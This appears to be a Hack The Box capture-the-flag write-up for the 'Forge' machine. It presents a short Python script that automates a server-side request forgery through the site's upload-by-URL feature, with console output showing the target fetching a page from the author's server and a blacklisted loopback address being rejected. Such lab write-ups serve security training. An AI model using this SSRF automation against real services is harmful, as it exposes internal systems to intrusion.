# Hack The Box. Machines. Forge

Machine write-up: https://7rocky.github.io/en/htb/forge

### `ssrf.py`

This Python script is used to automate the exploitation of a Server-Side Request Forgery (SSRF) vulnerability.

The code is really simple, this is the `main` function:

```python
def main():
    url = sys.argv[1]

    r = requests.post('http://forge.htb/upload', {'url': url, 'remote': 1})

    if 'http://forge.htb' not in r.text:
        print(re.findall(r'<strong>(.*?)</strong>', r.text)[0])
        exit()

    upload_url = re.findall(r'<a href="(http://forge\.htb/.*?)">', r.text)[0]

    r = requests.get(upload_url)
    print(r.text)
```

Basically, `http://forge.htb` provides the feature to upload images using an URL. If the URL is valid, then it will return another URL with a random path to access the uploaded image.

However, it does not check that the uploaded file is actually an image, so we can try to exploit an SSRF and point the URL to internal services.

The Python script just automates the process of uploading a file via URL and perform a GET request to the generated URL, all in one command. For example:

```console
$ cat index.html
<!doctype html>
<html lang="en">
  <head>
    <title>Test</title>
    <meta charset="uft-8">
  </head>
  <body>
    <h1>Test</h1>
  </body>
</html>

$ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
```

```console
$ python3 ssrf.py http://10.10.17.44
<!doctype html>
<html lang="en">
  <head>
    <title>Test</title>
    <meta charset="uft-8">
  </head>
  <body>
    <h1>Test</h1>
  </body>
</html>
```

```console
$ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.111 - - [] "GET / HTTP/1.1" 200 -
```

The machine has a blacklist for URL that are not allowed. In those cases, the page will show an error. This is also handled by the script:

```console
$ python3 ssrf.py http://127.0.0.1
URL contains a blacklisted address!
```
